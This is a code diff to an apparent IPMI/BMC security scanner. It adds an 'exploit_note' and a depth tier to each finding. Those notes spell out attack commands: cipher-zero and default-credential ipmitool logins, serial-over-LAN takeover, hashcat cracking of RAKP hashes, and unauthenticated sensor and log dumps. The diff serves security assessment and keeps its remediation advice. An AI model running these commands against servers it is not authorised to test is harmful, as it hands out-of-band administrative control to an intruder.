@@ -694,10 +694,12 @@ def ipmi_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "ipmitool", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -727,6 +729,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         f"-I lanplus -C 0 -H {h.ip} -U root -P '' chassis power "
                         f"status")
                     kind = "ipmi_cipher_zero_confirmed"
+                    exploit_note = (
+                        f"ipmitool -I lanplus -C 0 -H {h.ip} -U root -P '' "
+                        f"user list ; ipmitool -I lanplus -C 0 -H {h.ip} "
+                        "-U root -P '' chassis power status  # if either "
+                        "succeeds, full BMC admin")
+                    depth_tier = "t1"
                 else:
                     detail = (
                         f"BMC advertises 'none' auth in IPMI "
@@ -737,6 +745,10 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         f"admin. Verify with: ipmitool -I lanplus -C 0 "
                         f"-H {h.ip} -U root -P '' chassis power status")
                     kind = "ipmi_cipher_zero"
+                    exploit_note = (
+                        f"ipmitool -I lanplus -C 0 -H {h.ip} -U <any> -P "
+                        "anything user list  # if succeeds, cipher-0 is real")
+                    depth_tier = "t0"
                 out.append(_finding(
                     "critical",
                     "IPMI cipher suite 0 supported (CVE-2013-4786)", tgt,
@@ -747,7 +759,8 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "cipher suites 3+; HPE iLO: ipmi cipher-suite disable). If BMC "
                     "management is not needed remotely, restrict to a dedicated OOB "
                     "management network.",
-                    ["CWE-287", "CWE-306"], kind=kind))
+                    ["CWE-287", "CWE-306"], kind=kind,
+                    exploit_note=exploit_note, depth_tier=depth_tier))
             # Anonymous / null-user logon.
             if pr.get("anonymous_login") or pr.get("null_user"):
                 which = []
@@ -763,7 +776,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"ipmitool -I lanplus -H {h.ip} -U '' -P '' user list",
                     "Disable anonymous / null-user logon. Set strong unique passwords "
                     "on every enabled BMC user slot; disable unused slots.",
-                    ["CWE-287", "CWE-521"], kind="ipmi_anonymous"))
+                    ["CWE-287", "CWE-521"], kind="ipmi_anonymous",
+                    exploit_note=(
+                        f"ipmitool -I lanplus -H {h.ip} -U '' -P '' user "
+                        f"list ; ipmitool -I lanplus -H {h.ip} -U ADMIN -P "
+                        "ADMIN sol activate  # KVM/serial into host"),
+                    depth_tier="t1"))
             # Weak auth algorithms.
             weak = [t for t in ("MD2", "MD5") if t in (pr.get("auth_types") or [])]
             if weak:
@@ -826,7 +844,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "management network and enforce a password policy strong "
                     "enough that offline cracking is infeasible (16+ char "
                     "high-entropy).",
-                    ["CWE-916", "CWE-522"], kind="ipmi_rakp_hash"))
+                    ["CWE-916", "CWE-522"], kind="ipmi_rakp_hash",
+                    exploit_note=(
+                        "hashcat -m 7300 loot/ipmi.hash "
+                        "/usr/share/wordlists/rockyou.txt --force ; then "
+                        f"ipmitool -I lanplus -H {h.ip} -U <user> -P "
+                        "<cracked> user list ; sol activate"),
+                    depth_tier="t2"))
 
                 # Username enumeration: some BMCs answer differently for valid
                 # vs invalid users, so the sweep's success/failure map tells
@@ -869,7 +893,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "(vendor-specific: ipmitool lan set <chan> auth ADMIN "
                     "MD5,PASSWORD; on iDRAC via racadm set idrac.ipmilan.*).",
                     ["CWE-306", "CWE-345"],
-                    kind="ipmi_per_msg_auth_disabled"))
+                    kind="ipmi_per_msg_auth_disabled",
+                    exploit_note=(
+                        "review GCAC output; capture a live session with "
+                        "tcpdump and inspect for MAC-less messages"),
+                    depth_tier="t0"))
             # Bit 3: user-level auth disabled — user-priv commands take no
             # auth type at all, so sensor reads / SEL dumps / vendor info
             # commands leak with no credential.
@@ -885,7 +913,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Require authentication at the USER privilege level on the "
                     "BMC channel (vendor-specific channel-authcap setting).",
                     ["CWE-306"],
-                    kind="ipmi_userlevel_auth_disabled"))
+                    kind="ipmi_userlevel_auth_disabled",
+                    exploit_note=(
+                        f"ipmitool -I lan -H {h.ip} -A NONE sensor list ; "
+                        f"ipmitool -I lan -H {h.ip} -A NONE sel list"),
+                    depth_tier="t1"))
             # Bit 5: KG (BMC key) set or NOT set. When not set, K_uid
             # collapses to HMAC(password) so any captured RAKP2 (see the
             # ipmi_rakp_hash finding above) is straight-line crackable.
